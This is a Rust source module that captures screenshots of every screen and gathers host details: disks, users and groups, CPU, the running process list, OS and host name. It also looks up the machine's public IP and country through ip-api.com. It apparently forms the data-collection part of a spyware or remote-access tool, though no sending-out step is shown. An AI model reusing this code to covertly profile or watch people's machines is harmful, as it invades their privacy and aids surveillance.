
pub mod winMethods {
    use reqwest::blocking::get;
    use serde_json::{json, Value};
    use std::fmt::format;

    pub mod colectSysinfo {
        use human_bytes::human_bytes;
        use screenshots::Screen;
        use std::any::Any;
        use std::fmt::{format, Debug};
        use sysinfo::{
            CpuExt, DiskExt, NetworksExt, Pid, ProcessExt, System, SystemExt, User, UserExt,
        };
        pub fn screenphoto() -> Result<Vec<u8>, ()> {
            let photo = Screen::all();
            if let Ok(Screen) = photo {
                let mut buffer: Vec<u8> = Vec::new();

                for screen in Screen {
                    let image = screen.capture();
                    match image {
                        Ok(img) => {
                            let img = img.to_png();
                            if img.is_err() {
                                continue;
                            }

                            buffer = img.unwrap();
                        }
                        _ => {
                            continue;
                        }
                    }
                }

                Ok(buffer)
            } else {
                Err(())
            }
        }

        pub fn sysinfo() -> String {
            let sys = System::new_all();
            let mut NetWorkInterface: String = String::new();
            _ = sys.networks().iter().for_each(|(Interface, NetworkData)| {
                NetWorkInterface.push_str(format!("Network: {}\n", Interface).as_str());
            });
            let mut FormatDisks = String::new();
            _ = sys.disks().iter().for_each(|hardDisks| {

                let namePathMount = hardDisks.name().to_str().unwrap_or("0xffff");
                let TypeDiskMount = String::from_utf8_lossy(hardDisks.file_system());
                let mountPath: String = hardDisks.mount_point().to_string_lossy().into();
                let TypeDisk = hardDisks.kind();
                let HdMemorySpace = human_bytes(hardDisks.total_space() as f64);
                let HdMemorySpaceAloc = human_bytes(hardDisks.available_space() as f64);


                let HardDiskInfo = format!("Disk: {}\nTypeDIsk Mount: {}\nLocate disk Mount: {}\nTypeDisk: {:?}\nMemory All: {}\nMemory free: {}\n\n", namePathMount, TypeDiskMount,mountPath, TypeDisk,HdMemorySpace, HdMemorySpaceAloc);

                FormatDisks.push_str( HardDiskInfo.as_str());
            } );

            let mut StringUser = String::new();
            _ = sys.users().iter().for_each(|user| {
                let Name = user.name();
                let grupos = user.groups();
                StringUser.push_str(format!("Name: {} | Group: {:?} \n", Name, grupos).as_str());
            });

            let CpuNameProcess: String = {
                if let Some(nameCpu) = sys.cpus().get(0) {
                    format!("Name Cpu : {}", nameCpu.brand().to_string())
                } else {
                    "Name Cpu : Failed capture".into()
                }
            };

            let mut PidProcess = String::new();
            _ = {
                let HashMapProcess = sys.processes();

                for (_, Process) in HashMapProcess {
                    PidProcess.push_str(
                        format!(
                            "NameProcess: {} , Pid: {}\n",
                            Process.name(),
                            Process.pid().to_string()
                        )
                        .as_str(),
                    );
                }
            };
            let data: String = format!(
                "\nDistribution: {}\nSystem name: {}\nSystem kernel version: {}\nSystem OS version: {}\nSystem host name: {}\n",sys.distribution_id(),
                sys.name().unwrap_or("Failed".into()),
                sys.kernel_version().unwrap_or("Failed".into()),
                sys.os_version().unwrap_or("Failed".into()),
                sys.host_name().unwrap_or("Failed".into()));
            format!("System info\n{}\nInterfeces Net\n\n{}\nDisks\n\n{}\nUsers\n\n{}\nCpu Name\n\n{}\nPid-time Process\n\n{}\n", data, NetWorkInterface,FormatDisks, StringUser, CpuNameProcess,PidProcess)
        }
    }

    pub fn LocationIPAdrres() -> Option<String> {
        let GetLocation = get("http://ip-api.com/json/?fields=country,countryCode,query");
        match GetLocation {
            Ok(HttpsResponse) => {
                let valor = HttpsResponse.text();
                if let Ok(txtMsg) = valor {
                    let parseJson: Value =
                        serde_json::from_str(txtMsg.as_str()).unwrap_or(json!("Not found"));

                    let country = parseJson["country"].as_str().unwrap_or("not found");
                    let countryCode = parseJson["countryCode"].as_str().unwrap_or(" not found");
                    let query = parseJson["query"].as_str().unwrap_or("not found");

                    return Some(format!(
                        "Country: {country}\ncountryCode: {countryCode}\nIp: {query}\n"
                    ));
                }

                return None;
            }

            _ => None,
        }
    }
}
